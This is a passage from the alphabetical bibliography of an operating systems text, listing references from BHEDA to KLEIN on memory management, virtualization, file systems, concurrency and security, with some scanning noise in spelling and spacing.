BHEDA,R.A.,BEU,J.G.,RAILING,B.P.,and CONTE,T.M.:“Extrapolation Pitfalls When Evaluating Limited Endurance Memory,"Proc.20th Int'Symp.on Modeling,Analy- sis,&Simulation of Computer and Telecomm.Systems,IEEE,pp.261-268,2012.
BHEDA,R.A.,POOVEY,J.A.,BEU,J.G.,and CONTE,T.M.: “Energy Efficient Phase
Change Memory Based Main Memory for Future High Performance Systems,"Proc. Int'l Green Computing Conf.,IEEE,pp.1-8,2011.
BHOEDJANG,R.A.F.,RUHL,T.,and BAL,H.E.:"User-Level Network Interface Proto-
cols,"Computer,vol.31,pp.53-60,Nov.1998.
BIBA,K.: "Integrity Considerations for Secure Computer Systems,"Technical Report 76-371,U.S.Air Force Electronic Systems Division,1977.
BIRRELL,A.D.,and NELSON,B.J.:"Implementing Remote Procedure Calls,"ACM Trans.
on Computer Systems,vol.2,pp.39-59,Feb.1984.
BISHOP,M.,and FRINCKE,D.A.:“Who Owns Your Computer?
”IEEE Security and Pri- vacy,vol.4,pp.61-63,2006.
BLACKHAM,B,SHI,Y.and HEISER,G.:“Improving Interrupt Response Time in a Verifi- able Protected Microkernel,”Proc.Seventh European Conf.on Computer Systems (EUROSYS),April,2012.
BOEHM,B.: Software Engineering Economics,Upper Saddle River,NJ:Prentice Hall, 1981.
BOGDANOV,A.,AND LEE,C.H.:“Limits of Provable Security for Homomorphic Encryp- tion,"Proc.33rd Int'l Cryptology Conf.,Springer,2013.
BORN,G:Inside the Windows 98 Registry,Redmond,WA:Microsoft Press,1998.
BOTELHO,E.C,SHILANE,P.,GARG,N.,and HSU,W.:"Memory Efficient Sanitization of a Deduplicated Storage System,"Proc.11th USENIX Conf.on File and Storage Tech., USENIX,pp.81-94,2013.
BOTERO,J.F.,and HESSELBACH,X.:"Greener Networking in a Network Virtualization
Environment,"Computer Networks,vol.57,pp.2021-2039,June 2013.
BOVET,D.P,and CESATI,M.: Understanding the Linux Kernel,Sebastopol,CA:O'Reilly &Associates,2005.
BOYD-WICKIZER,S.,CHEN,H.,CHEN,R.,MAO,Y.,KAASHOEK,F,MORRIS,R.,
PESTEREV,A.,STEIN,L.,WU,M,DAI,Y.,ZHANG,Y.,and ZHANG,Z.:“Corey:an Operating System for Many Cores,"Proc.Eighth Symp.on Operating Systems Design and Implementation,USENIX,pp.43-57,2008.
BOYD-WICKIZER,S.,CLEMENTS A.T,MAO,Y.,PESTEREV,A.,KAASHOEK,E.M.,
MORRIS,R.,and ZELDOVICH,N:“An Analysis of Linux Scalability to Many
Cores,"Proc.Ninth Symp.on Operating Systems Design and Implementation, USENIX,2010.
BRATUS,S.:"What Hackers Learn That the Rest of Us Don't:Notes on Hacker Curricu- lum,"IEEE Security and Privacy,vol.5,pp.72-75,July/Aug.2007.
BRATUS,S.,LOCASTO,M.E.,PATTERSON,M.,SASSAMAN,L.,SHUBINA,A.:" From Buffer Overflows to Weird Machines and Theory of Computation,”;Login;,USENIX, pp.11-21,December 2011.
BRINCH HANSEN,P.: “The Programming Language Concurrent Pascal,”IEEE Trans.on Software Engineering,vol.SE-1,pp.199-207,June 1975.
BROOKS,E.P.,Jr: "No Silver Bullet—Essence and Accident in Software Engineering,”"
Computer,vol.20,pp.10-19,April 1987.
BROOKS,E.P.,Jr: The Mythical Man-Month:Essays on Software Engineering,20th
Anniversary Edition,Boston:Addison-Wesley,1995.
BRUSCHI,D.,MARTIGNONI,L.,and MONGA,M.:“Code Normalization for Self-Mutat-
ing Malware,"IEEE Security and Privacy,vol.5,pp.46-54,March/April 2007.
BUGNION,E,DEVINE,S.,GOVIL,K.,and ROSENBLUM,M.: "Disco:Running Commod- ity Operating Systems on Scalable Multiprocessors,"ACM Trans.on Computer Sys- tems,vol.15,pp.412-447,Nov.1997.
BUGNION,E.,DEVINE,S.,ROSENBLUM,M.,SUGERMAN,J.,and WANG,E.:“Bringing Virtualization to the x86 Architecture with the Original VMware Workstation,"ACM Trans.on Computer Systems,vol.30,number 4,pp.12:1-12:51,Nov.2012.
BULPIN,J.R.,and PRATT,IA.:"Hyperthreading-Aware Process Scheduling Heuristics,"
Proc. USENIX Ann.Tech.Conf,USENIX,pp.399-403,2005.
CAI,J.,and STRAZDINS,P.E:“An Accurate Prefetch Technique for Dynamic Paging Behaviour for Software Distributed Shared Memory,"Proc.41st Int'l Conf.on Paral- lel Processing,IEEE.,pp.209-218,2012.
CAI,Y.,and CHAN,W.K.: "MagicFuzzer:Scalable Deadlock Detection for Large-scale Applications,"Proc.2012 Int'Conf.on Software Engineering,IEEE,pp.606-616, 2012.
CAMPISI,P.:Security and Privacy in Biometrics,New York:Springer,2013.
CARPENTER,M.,LISTON,T.,and SKOUDIS,E.:“Hiding Virtualization from Attackers
and Malware,"IEEE Security and Privacy,vol.5,pp.62-65,May/June 2007.
CARR,R.W.,and HENNESSY,J.L:“WSClock—A Simple and Effective Algorithm for Virtual Memory Management,"Proc.Eighth Symp.on Operating Systems Principles, ACM,pp.87-95,1981.
CARRIERO,N,and GELERNTER,D.:"The S/Net's Linda Kernel,"ACM Trans.on Com- puter Systems,vol.4,pp.110-129,May 1986.
CARRIERO,N,and GELERNTER,D.:"Linda in Context,"Commun.of the ACM,vol.32, pp.444-458,April 1989.
CERF,C.,and NAVASKY,V.:The Experts Speak,New York:Random House,1984.
CHEN,M.-S.,YANG,B.-Y.,and CHENG,C.-M:"RAIDq:A Software-Friendly,Multiple- Parity RAID,"Proc.Fifth Workshop on Hot Topics in File and Storage Systems, USENIX,2013.
CHEN,Z.,XIAO,N.,and LIU, F.:“SAC:Rethinking the Cache Replacement Policy for SSD-Based Storage Systems,"Proc.Fifth Int'T Systems and Storage Conf,ACM,Art. 13,2012.
CHERVENAK,A.,VELLANKI,V.,and KURMAS,Z.: “Protecting File Systems:A Survey of Backup Techniques,"Proc.15th IEEE Symp.on Mass Storage Systems,IEEE, 1998.
CHOI,S.,and JUNG,S.: “A Locality-Aware Home Migration for Software Distributed
Shared Memory,"Proc.2013 Conf.on Research in Adaptive and Convergent Systems, ACM,pp.79-81,2013.
CHOW,T.C.K.,and ABRAHAM,J.A.: "Load Balancing in Distributed Systems,"IEEE Trans.on Software Engineering,vol.SE-8,pp.401-412,July 1982.
CLEMENTS,A.T,KAASHOEK,M.F.,ZELDOVICH,N.,MORRIS,R.T.,and KOHLER,E.: "The Scalable Commutativity Rule:Designing Scalable Software for Multicore Pro- cessors,"Proc.24th Symp.on Operating Systems Principles,ACM,pp.1-17,2013.
COFFMAN,E.G.,ELPHICK,M.J.,and SHOSHANI,A.:"System Deadlocks,"Computing Surveys,vol.3,pp.67-78,June 1971.
COLP,P.,NANAVATI,M.,ZHU,J.,AIELLO,W.,COKER,G.,DEEGAN,T.,LOSCOCCO,P.,
and WARFIELD,A.: "Breaking Up Is Hard to Do:Security and Functionality in a Commodity Hypervisor,"Proc.23rd Symp.of Operating Systems Principles,ACM, pp.189-202,2011.
COOKE,D.,URBAN,J.,and HAMILTON,S.:“UNIX and Beyond:An Interview with Ken Thompson,"Computer,vol.32,pp.58-64,May 1999.
COOPERSTEIN,J.: Writing Linux Device Drivers:A Guide with Exercises,Seattle:Cre- ateSpace,2009.
CORBATO,EJ.:"On Building Systems That Will Fail,"Commun.of the ACM,vol.34,pp.
72-81,June 1991.
CORBATO,F.J.,MERWIN-DAGGETT,M.,and DALEY,R.C:“An Experimental Time-
Sharing System,"Proc.AFIPS Fall Joint Computer Conf.,AFIPS,pp.335-344,1962.
CORBATO,F.J,and VYSSOTSKY,V.A.:"Introduction and Overview of the MULTICS
System,"Proc.AFIPS Fall Joint Computer Conf,AFIPS,pp.185-196,1965.
CORBET,J.,RUBINI,A,and KROAH-HARTMAN,G.:Linux Device Drivers,Sebastopol, CA:O'Reilly &Associates,2009.
CORNWELL,M.:"Anatomy of a Solid-State Drive,“ACM Queue 1010,pp.30-37,2012.
CORREIA,M.,GOMEZ FERRO,D.,JUNQUEIRA,F.P.,and SERAFINI,M.: "Practical
Hardening of Crash-Tolerant Systems,"Proc.USENIX Ann.Tech.Conf.,USENIX, 2012.
COURTOIS,P.J.,HEYMANS,F.,and PARNAS,D.L.:“Concurrent Control with Readers and Writers,"Commun.of the ACM,vol.10,pp.667-668,Oct.1971.
CROWLEY,C.:Operating Systems:A Design-Oriented Approach,Chicago:Irwin,1997.
CUSUMANO,M.A.,and SELBY,R.W.:"How Microsoft Builds Software,"Commun.of the ACM,vol.40,pp.53-61,June 1997.
DABEK,F,KAASHOEK,M.E,KARGET,D.,MORRIS,R.,and STOICA,I:“Wide-Area Cooperative Storage with CFS,"Proc.18th Symp.on Operating Systems Principles, ACM,pp.202-215,2001.
DAI,Y.,QI,Y.,REN,J.,SHI,Y.,WANG,X.,and YU,X.:“A Lightweight VMM on Many Core for High Performance Computing,"Proc.Ninth Int'T Conf.on Virtual Execution Environments,ACM,pp.111-120,2013.
DALEY,R.C.,and DENNIS,J.B.:"Virtual Memory,Process,and Sharing in MULTICS,"
Commun.of the ACM,vol.11,pp.306-312,May 1968.
DASHTI,M.,FEDOROVA,A,FUNSTON,J.,GAUD,F.,LACHAIZE,R.,LEPERS,B.,
QUEMA,V.,and ROTH,M.: "Traffic Management:A Holistic Approach to Memory
Placement on NUMA Systems,”Proc.18th Int'Conf.on Arch.Support for Prog. Lang.and Operating Systems,ACM,pp.381-394,2013.
DAUGMAN,J.:“How Iris Recognition Works,”IEEE Trans.on Circuits and Systems for Video Tech.,vol.14,pp.21-30,Jan.2004.
DAWSON-HAGGERTY,S.,KRIOUKOV,A.,TANEJA,J.,KARANDIKAR,S.,FIERRO,G.,
and CULLER,D:"BOSS:Building Operating System Services,"Proc.10th Symp.on
Networked Systems Design and Implementation,USENIX,pp.443-457,2013.
DAYAN,N.,SVENDSEN,M.K.,BJORING,M.,BONNET,P.,and BOUGANIM,L.:“Eagle- Tree:Exploring the Design Space of SSD-based Algorithms,"Proc.VLDB Endow- ment,vol.6,pp.1290-1293,Aug.2013.
DE BRUIJN,W.,BOS,H.,and BAL,H.:"Application-Tailored I/O with Streamline,"ACM
Trans.on Computer Syst.,vol.29,number 2,pp.1-33,May 2011.
DE BRUIJN,W.,and BOS,H.:"Beltway Buffers:Avoiding the OS Traffic Jam,"Proc.27th Int'Conf.on Computer Commun.,April 2008.
DENNING,PJ.:"The Working Set Model for Program Behavior,"Commun.of the ACM, vol.11,pp.323-333,1968a.
DENNING,P.J.:"Thrashing:Its Causes and Prevention,"Proc.AFIPS National Computer Conf,AFIPS,pp.915-922,1968b.
DENNING,P.J.:"Virtual Memory,"Computing Surveys,vol.2,pp.153-189,Sept.1970. DENNING,D.:Information Warfare and Security,Boston:Addison-Wesley,1999.
DENNING,PJ.:"Working Sets Past and Present,"IEEE Trans.on Software Engineering, vol.SE-6,pp.64-84,Jan.1980.
DENNIS,J.B.,and VAN HORN,E.C.:"Programming Semantics for Multiprogrammed Computations,"Commun.of the ACM,vol.9,pp.143-155,March 1966.
DIFFIE,W.,and HELLMAN,M.E.: "New Directions in Cryptography,"IEEE Trans.on Information Theory,vol.IT-22,pp.644-654,Nov.1976.
DIJKSTRA,E.W.: "Co-operating Sequential Processes,"in Programming Languages,
Genuys,F.(Ed.),London:Academic Press,1965.
DIJKSTRA,E.W.: "The Structure of THE Multiprogramming System,"Commun.of the ACM,vol.11,pp.341-346,May 1968.
DUBOIS,M.,SCHEURICH,C,and BRIGGS,F.A.:"Synchronization,Coherence,and
Event Ordering in Multiprocessors,"Computer,vol.21,pp.9-21,Feb.1988.
DUNN,A.,LEE,M.Z.,JANA,S.,KIM,S.,SILBERSTEIN,M.,XU,Y.,SHMATIKOV,V.,and
WITCHEL,E.: “Eternal Sunshine of the Spotless Machine:Protecting Privacy with Ephemeral Channels,"Proc.10th Symp.on Operating Systems Design and Implemen- tation,USENIX,pp.61-75,2012.
DUTTA,K.,SINGH,V.K.,and VANDERMEER,D.:“Estimating Operating System Process
Energy Consumption in Real Time,"Proc.Eighth Int'Conf.on Design Science at the
Intersection of Physical and Virtual Design,Springer-Verlag,pp.400-404,2013.
EAGER,DL,LAZOWSKA,E.D,and ZAHORJAN,J:“Adaptive Load Sharing in Homo- geneous Distributed Systems,"IEEE Trans.on Software Engineering,vol.SE-12,pp 662-675,May 1986.
EDLER,J.,LIPKIS,J.,and SCHONBERG,E.:“Process Management for Highly Parallel UNIX Systems,"Proc.USENIX Workshop on UNIX and Supercomputers,USENIX, pp.1-17,Sept.1988.
EL FERKOUSS,o.,SNAIKI,I,MOUNAOUAR,o.,DAHMOUNI,H.,BEN ALI,R.,
LEMIEUX,Y.,and OMAR,C.:“A100Gig Network Processor Platform for Openflow,”
Proc.Seventh Int'Conf.on Network Services and Management,IFIP,pp.286-289,
2011.
EL GAMAL,A.: “A Public Key Cryptosystem and Signature Scheme Based on Discrete
Logarithms,"IEEE Trans.on Information Theory,vol.IT-31,pp.469-472,July 1985.
ELNABLY.,A.,and WANG,H.:“Efficient QoS for Multi-Tiered Storage Systems,”Proc.
Fourth USENIX Workshop on Hot Topics in Storage and File Systems,USENIX,2012.
ELPHINSTONE,K.,KLEIN,G.,DERRIN,P.,ROSCOE,T.,and HEISER,G.:“Towards a
Practical,Verified,Kernel,"Proc.11th Workshop on Hot Topics in Operating Systems, USENIX,pp.117-122,2007.
ENGLER,D.R,CHELF,B.,CHOU,A.,and HALLEM,S:“Checking System Rules Using
System-Specific Programmer-Written Compiler Extensions,”Proc.Fourth Symp.on Operating Systems Design and Implementation,USENIX,pp.1-16,2000.
ENGLER,D.R.,KAASHOEK,M.F.,and O'TOOLE,J.Jr:"Exokernel:An Operating Sys-
tem Architecture for Application-Level Resource Management,"Proc.15th Symp.on Operating Systems Principles,ACM,pp.251-266,1995.
ERL,T.,PUTTINI,R.,and MAHMOOD,Z.:“Cloud Computing:Concepts,Technology &
Architecture,"Upper Saddle River,NJ:Prentice Hall,2013.
EVEN,S.:Graph Algorithms,Potomac,MD:Computer Science Press,1979.
FABRY,R.S.:“Capability-Based Addressing,”Commun.of the ACM,vol.17,pp.403-412, July 1974.
FANDRICH,M.,AIKEN,M.,HAWBLITZEL,C.,HODSON,O.,HUNT,G,LARUS,J.R.,and
LEVI,S.:"Language Support for Fast and Reliable Message-Based Communication in Singularity OS,"Proc.First European Conf.on Computer Systems (EUROSYS),ACM, pp.177-190,2006.
FEELEY, MJ.,MORGAN,W.E,PIGHIN,F.H.,KARLIN,A.R.,LEVY,H.M.,and
THEKKATH,C.A.:"Implementing Global Memory Management in a Workstation Cluster,"Proc.15th Symp.on Operating Systems Principles,ACM,pp.201-212, 1995.
FELTEN,E.W.,and HALDERMAN,J.A.:"Digital Rights Management,Spyware,and Secu- rity,”IEEE Security and Privacy,vol.4,pp.18-23,Jan./Feb.2006.
FETZER,C.,and KNAUTH, T.:“Energy-Aware Scheduling for Infrastructure Clouds,”
Proc.Fourth Int'Conf.on Cloud Computing Tech.and Science,IEEE,pp.58-65, 2012.
FEUSTAL, E.A.:"The Rice Research Computer—A Tagged Architecture,"Proc.AFIPS Conf,AFIPS,1972.
FLINN,J.,and SATYANARAYANAN,M.:"Managing Battery Lifetime with Energy-Aware
Adaptation,"ACM Trans.on Computer Systems,vol.22,pp.137-179,May 2004.
FLORENCIO,D.,and HERLEY,C.:“ALarge-Scale Study of Web Password Habits,”Proc.
16th Int'Conf.on the World Wide Web,ACM,pp.657-666,2007.
FORD,R.,and ALLEN,W.H.:"How Not To Be Seen,"IEEE Security and Privacy,vol.5, pp.67-69,Jan./Feb.2007.
FOTHERINGHAM,J.:"Dynamic Storage Allocation in the Atlas Including an Automatic
Use of a Backing Store,"Commun.of the ACM,vol.4,pp.435-436,Oct.1961.
FRYER, D.,SUN,K.,MAHMOOD,R.,CHENG,T.,BENJAMIN,S.,GOEL,A.,and DEMKE BROWN,A .:“ReCon:Verifying File System Consistency at Runtime,”Proc.10th USENIX Conf.on File and Storage Tech., USENIX,pp.73-86,2012.
FUKSIS,R.,GREITANS,M.,and PUDZS,M.:"Processing of Palm Print and Blood Vessel Images for Multimodal Biometrics,"Proc.COST1011 European Conf.on Biometrics and ID Mgt,Springer-Verlag,pp.238-249,2011.
FURBER,S.B.,LESTER,D.R.,PLANA,L.A.,GARSIDE,J.D.,PAINKRAS,E.,TEMPLE,S. , and BROWN,A.D.: “Overview of the SpiNNaker System Architecture,”Trans.on Computers,vol.62,pp.2454-2467,Dec.2013.
FUSCO,J.:The Linux Programmer's Toolbox,Upper Saddle River,NJ:Prentice Hall,2007. GARFINKEL,T.,PFAFF,B,CHOW,J.,ROSENBLUM,M.,and BONEH,D.:"Terra:A Vir-
tual Machine-Based Platform for Trusted Computing,"Proc.19th Symp.on Operating Systems Principles,ACM,pp.193-206,2003.
GAROFALAKIS,J.,and STERGIOU,E.:“An Analytical Model for the Performance Evalu- ation of Multistage Interconnection Networks with Two Class Priorities,"Future Gen- eration Computer Systems,vol.29,pp.114-129,Jan.2013.
GEER,D.: "For Programmers,Multicore Chips Mean Multiple Challenges,"Computer, vol.40,pp.17-19,Sept.2007.
GEIST,R.,and DANIEL,S.:“A Continuum of Disk Scheduling Algorithms,”ACM Trans.
on Computer Systems,vol.5,pp.77-92,Feb.1987.
GELERNTER,D.: "Generative Communication in Linda,"ACM Trans.on Programming Languages and Systems,vol.7,pp.80-112,Jan.1985.
GHOSHAL,D.,and PLALE,B:"Provenance from Log Files:a BigData Problem,"Proc.
Joint EDBT/ICDT Workshops,ACM,pp.290-297,2013.
GIFFIN,D,LEVY,A.,STEFAN,D.,TEREI,D.,MAZIERES,D.: "Hails:Protecting Data Pri- vacy in Untrusted Web Applications,"Proc.10th Symp.on Operating Systems Design and Implementation,USENIX,2012.
GIUFFRIDA,C.,KUIJSTEN,A.,and TANENBAUM,A.S.: “Enhanced Operating System
Security through Efficient and Fine-Grained Address Space Randomization,"Proc. 21st USENIX Security Symp.,USENIX,2012.
GIUFFRIDA,C,KUIJSTEN,A.,and TANENBAUM,A.S.:"Safe and Automatic Live
Update for Operating Systems,"Proc.18th Int'Conf.on Arch.Support for Prog. Lang.and Operating Systems,ACM,pp.279-292,2013.
GOLDBERG,R.P:: Architectural Principles for Virtual Computer Systems,Ph.D.thesis, Harvard University,Cambridge,MA,1972.
GONG,L .:Inside Java 2 Platform Security,Boston:Addison-Wesley,1999.
GONZALEZ-FEREZ,P.,PIERNAS,J.,and CORTES,T.:"DADS:Dynamic and Automatic
Disk Scheduling,"Proc.27th Symp.on Appl.Computing,ACM,pp.1759-1764,2012.
GORDON,M.S.,JAMSHIDI,D.A.,MAHLKE,S.,and MAO,Z.M.:“COMET:Code Offload by Migrating Execution Transparently,"Proc.10th Symp.on Operating Systems Design and Implementation,USENIX,2012.
GRAHAM,R.: "Use of High-Level Languages for System Programming,"Project MAC Report TM-13,M.IT.,Sept.1970.
GROPP,W.,LUSK,E.,and SKJELLUM,A.:Using MPI:Portable Parallel Programming with the Message Passing Interface,Cambridge,MA:MI.T.Press,1994.
GUPTA,L.:“QoS in Interconnection of Next Generation Networks,"Proc.Fifth Int'l Conf.
on Computational Intelligence and Commun.Networks,IEEE,pp.91-96,2013.
HAERTIG,H.,HOHMUTH,M.,LIEDTKE,J.,and SCHONBERG,S.:“The Performance of
Kernel-Based Systems,"Proc.16th Symp.on Operating Systems Principles,ACM,pp. 66-77,1997.
HAFNER,K.,and MARKOFF,J.: Cyberpunk,New York:Simon and Schuster,1991.
HAITJEMA,M.A.:Delivering Consistent Network Performance in Multi-Tenant Data Cen- ters,Ph.D.thesis,Washington Univ.,2013.
HALDERMAN,J.A,and FELTEN,E.W.:"Lessons from the Sony CD DRM Episode," Proc.15th USENLX Security Symp., USENIX,pp.77-92,2006.
HAN,S.,MARSHALL,S.,CHUN,B.-G.,and RATNASAMY,S.:"MegaPipe:A New Pro-
gramming Interface for Scalable Network I/O,"Proc.USENLX Ann.Tech.Conf, USENIX,pp.135-148,2012.
HAND,S.M.,WARFIELD,A.,FRASER,K.,KOTTSOVINOS,E.,and MAGENHEIMER,D.: “Are Virtual Machine Monitors Microkernels Done Right?
,”Proc.10th Workshop on Hot Topics in Operating Systems,USENIX,pp.1-6,2005.
HARNIK,D.,KAT,R.,MARGALIT,O,SOTNIKOV,D.,and TRAEGER,A.:"To Zip or Not to Zip:Effective Resource Usage for Real-Time Compression,"Proc.11th USENZX Conf.on File and Storage Tech., USENIX,pp.229-241,2013.
HARRISON,M.A.,RUZZO,W.L.,and ULLMAN,J.D.: "Protection in Operating Systems," Commun.of the ACM,vol.19,pp.461-471,Aug.1976.
HART,J.M.: Win32 System Programming,Boston:Addison-Wesley,1997.
HAUSER,C.,JACOBI,C.,THEIMER,M.,WELCH,B.,and WEISER,M.:“Using Threads
in Interactive Systems:A Case Study,"Proc.14th Symp.on Operating Systems Princi- ples,ACM,pp.94-105,1993.
HAVENDER,J.W.:"Avoiding Deadlock in Multitasking Systems,"IBM Systems J,vol.7, pp.74-84,1968.
HEISER,G.,UHLIG,V.,and LEVASSEUR,J.:“Are Virtual Machine Monitors Microker-
nels Done Right?
”ACM SIGOPS Operating Systems Rev,vol.40,pp.95-99,2006.
HEMKUMAR,D.,and VINAYKUMAR,K.: “Aggregate TCP Congestion Management for Internet QoS,"Proc.2012 Int'Conf.on Computing Sciences,IEEE,pp.375-378, 2012.
HERDER,J.N,BOS,H.,GRAS,B.,HOMBURG,P.,and TANENBAUM,A.S.:“Construction of a Highly Dependable Operating System,"Proc.Sixth European Dependable Com- puting Conf,pp.3-12,2006.
HERDER,J.N.,MOOLENBROEK,D.VAN,APPUSWAMY,R.,WU,B.,GRAS,B.,and
TANENBAUM,A.S.: "Dealing with Driver Failures in the Storage Stack,"Proc. Fourth Latin American Symp.on Dependable Computing,pp.119-126,2009.
HEWAGE,K.,and VOIGT,T:"Towards TCP Communication with the Low Power Wire- less Bus,"Proc.11th Conf.on Embedded Networked Sensor Systems,ACM,Art.53, 2013.
HILBRICH,T.DE SUPINSKI,R.,NAGEL,W.,PROTZE,J,BAIER,,C,and MULLER,M.: “Distributed Wait State Tracking for Runtime MPI Deadlock Detection,”Proc.2013 Int'7 Conf.for High Performance Computing,Networking,Storage and Analysis, ACM,New York,NY,USA,2013.
HILDEBRAND,D.:“An Architectural Overview of QNX,”Proc.Workshop on Microker- nels and Other Kernel Arch.,ACM,pp.113-136,1992.
HIPSON,P.:Mastering Windows XP Registry,New York:Sybex,2002.
HOARE,C.A.R.: "Monitors,An Operating System Structuring Concept,"Commun.of the
ACM,vol.17,pp.549-557,Oct.1974;Erratum in Commun.of the ACM,vol.18,p.
95,Feb.1975.
HOCKING,M: "Feature:Thin Client Security in the Cloud,"J.Network Security,vol.
2011,pp.17-19,June 2011.
HOHMUTH,M.,PETER,M.,HAERTIG,H,and SHAPIRO,J:“Reducing TCB Size by
Using Untrusted Components:Small Kernels Versus Virtual-Machine Monitors,"Proc. 11th ACM SIGOPS European Workshop,ACM,Art.22,2004.
HOLMBACKA,S.,AGREN,D.,LAFOND,S.,and LILIUS,J.: “QoS Manager for Energy
Efficient Many-Core Operating Systems,"Proc.21st Euromicro Int'T Conf.on Paral- lel,Distributed,and Network-based Processing,IEEE,pp.318-322,2013.
HOLT,R.C.:"Some Deadlock Properties of Computer Systems,"Computing Surveys,vol.
4,pp.179-196,Sept.1972.
HOQUE,M.A.,SIEKKINEN,and NURMINEN,J.K.:"TCP Receive Buffer Aware Wireless Multimedia Streaming:An Energy Efficient Approach,"Proc.23rd Workshop on Net- work and Operating System Support for Audio and Video,ACM,pp.13-18,2013.
HOWARD,M.,and LEBLANK,D.: Writing Secure Code,Redmond,WA:Microsoft Press, 2009.
HRUBY,T.,VOGT,D.,BOS,H.,and TANENBAUM,A.S.: "Keep Net Working—On a
Dependable and Fast Networking Stack,"Proc.42nd Conf.on Dependable Systems and Networks,IEEE,pp.1-12,2012.
HUND,R.WILLEMS,C.AND HOLZ,T.:"Practical Timing Side Channel Attacks against Kernel Space ASLR,"Proc.IEEE Symp.on Security and Privacy,IEEE,pp.191-205, 2013.
HRUBY,T,D,BOS,H.,and TANENBAUM,A.S.:"When Slower Is Faster:On Heteroge-
neous Multicores for Reliable Systems,"Proc.USENIX Ann.Tech.Conf,USENIX, 2013.
HUA,J.,LI,M.,SAKURAI,K.,and REN,Y.:“Efficient Intrusion Detection Based on Static
Analysis and Stack Walks,"Proc.Fourth Int'Workshop on Security,Springer-Verlag,
pp.158-173,2009.
HUTCHINSON,N.C.,MANLEY,S.,FEDERWISCH,M.,HARRIS,G.,HITZ,D.,KLEIMAN,
S.,and O'MALLEY,S.:"Logical vs.Physical File System Backup,"Proc.Third Symp. on Operating Systems Design and Implementation,USENIX,pp.239-249,1999.
IEEE: Information Technology—Portable Operating System Interface(POSZX),Part 1:Sys- tem Application Program Interface (API)[C Language],New York:Institute of Elec- trical and Electronics Engineers,1990.
INTEL:"PCI-SIG SR-IOV Primer:An Introduction to SR-IOV Technology,"Intel White Paper,2011.
ION,E.: “From Touch Displays to the Surface:A Brief History of Touchscreen Technol- ogy,"ArsTechnica,History of Tech,April,2013
ISLOOR,S.S.,and MARSLAND,T.A.:"The Deadlock Problem:An Overview,"Computer, vol.13,pp.58-78,Sept.1980.
JANTZ,M.R.,STRICKLAND,C.,KUMAR,K.,DIMITROV,M.,and DOSHI,K.A.:“A
Framework for Application Guidance in Virtual Memory Systems,"Proc.Ninth Int' Conf.on Virtual Execution Environments,ACM,pp.155-166,2013.
JEONG,J.,KIM,H.,HWANG,J.,LEE,J.,and MAENG,S:"Rigorous Rental Memory
Management for Embedded Systems,"ACM Trans.on Embedded Computing Systems, vol.12,Art.43,pp.1-21,March 2013.
JIANG,X.,and XU,D.: "Profiling Self-Propagating Worms via Behavioral Footprinting,"
Proc.Fourth ACM Workshop in Recurring Malcode,ACM,pp.17-24,2006.
JIN,H.,LING,X.,IBRAHIM,S.,CAO,W.,WU,S.,and ANTONIU,G.:"Flubber:Two-Level
Disk Scheduling in Virtualized Environment,"Future Generation Computer Systems, vol.29,pp.2222-2238,Oct.2013.
JOHNSON,E.A:"Touch Display—A Novel Input/Output Device for Computers,"Elec- tronics Letters,vol.1,no.8,pp.219-220,1965.
JOHNSON,N.F.,and JAJODIA,S.:"Exploring Steganography:Seeing the Unseen,"Com- puter,vol.31,pp.26-34,Feb.1998.
JO0,Y.: "F2FS:A New File System Designed for Flash Storage in Mobile Devices,"
Embedded Linux Europe,Barcelona,Spain,November 2012.
JULA,H.,TOZUN,P.,and CANDEA,G.:"Communix:A Framework for Collaborative
Deadlock Immunity,"Proc.IEEE/IFIP 41st Int.Conf.on Dependable Systems and Networks,IEEE,pp.181-188,2011.
KABRI,K.,and SERET,D:“An Evaluation of the Cost and Energy Consumption of Secu-
rity Protocols in WSNs,"Proc.Third Int'T Conf.on Sensor Tech.and Applications, IEEE,pp.49-54,2009.
KAMAN,S.,SWETHA,K.,AKRAM,S.,and VARAPRASAS,G.:"Remote User Authentica- tion Using a Voice Authentication System,"Inf.SecurityJ,vol.22,pp.117-125,Issue 3,2013.
KAMINSKY,D.: “Explorations in Namespace:White-Hat Hacking across the Domain
Name System,"Commun.of the ACM,vol.49,pp.62-69,June 2006.
KAMINSKY,M.,SAVVIDES,G.,MAZIERES,D.,and KAASHOEK,M.E:"Decentralized User Authentication in a Global File System,"Proc.19th Symp.on Operating Systems Principles,ACM,pp.60-73,2003.
KANETKAR,Y.P.: Writing Windows Device Drivers Course Notes,New Delhi:BPB Publi- cations,2008.
KANT,K.,and MOHAPATRA,P.:“Internet Data Centers,”IEEE Computer vol.37,pp.
35-37,Nov.2004.
KAPRITSOS,M.,WANG,Y.,QUEMA,V.,CLEMENT,A.,ALVISI,L.,and DAHLIN,M.:
“All about Eve:Execute-Verify Replication for Multi-Core Servers,”Proc.10th Symp.
on Operating Systems Design and Implementation,USENIX,pp.237-250,2012.
KASIKCI,B.,ZAMFIR,C.and CANDEA,G.:"Data Races vs.Data Race Bugs:Telling the Difference with Portend,"Proc.17th Int'l Conf on Arch.Support for Prog.Lang.and Operating Systems,ACM,pp.185-198,2012.
KATO,s.,ISHIKAWA,Y.,and RAJKUMAR,R.: "Memory Management for Interactive
Real-Time Applications,"Real-Time Systems,vol.47,pp.498-517,May 2011.
KAUFMAN,C.,PERLMAN,R.,and SPECINER,M.:Network Security,2nd ed.,Upper Sad- dle River,NJ:Prentice Hall,2002.
KELEHER,P.,COX,A.,DWARKADAS,S.,and ZWAENEPOEL,W.: “TreadMarks:Dis- tributed Shared Memory on Standard Workstations and Operating Systems,”Proc. USENLX Winter Conf,USENIX,pp.115-132,1994.
KERNIGHAN,B.W.,and PIKE,R.: The UNIX Programming Environment,Upper Saddle River,NJ:Prentice Hall,1984.
KIM,J.,LEE,J.,CHOI,J.,LEE,D.,and NOH,S.H.: "Improving SSD Reliability with
RAID via Elastic Striping and Anywhere Parity,"Proc.43rd Int'Conf.on Depend- able Systems and Networks,IEEE,pp.1-12,2013.
KIRSCH,C.M.,SANVIDO,M.A.A.,and HENZINGER,T.A:“A Programmable Microkernel for Real-Time Systems,"Proc.First Int'l Conf.on Virtual Execution Environments, ACM,pp.35-45,2005.
KLEIMAN,S.R.:"Vnodes:An Architecture for Multiple File System Types in Sun UNIX,"
Proc. USENIX Summer Conf,USENIX,pp.238-247,1986.
KLEIN,G.,ELPHINSTONE,K.,HEISER,G.,ANDRONICK,J.,COCK,D.,DERRIN,P.,
ELKADUWE,D.,ENGELHARDT,K.,KOLANSKI,R.,NORRISH,M.,SEWELL,T.,
TUCH,H.,and WINWOOD,S:"seL4:Formal Verification of an OS Kernel,"Proc. 22nd Symp.on Operating Systems Primciples,ACM,pp.207-220,2009.
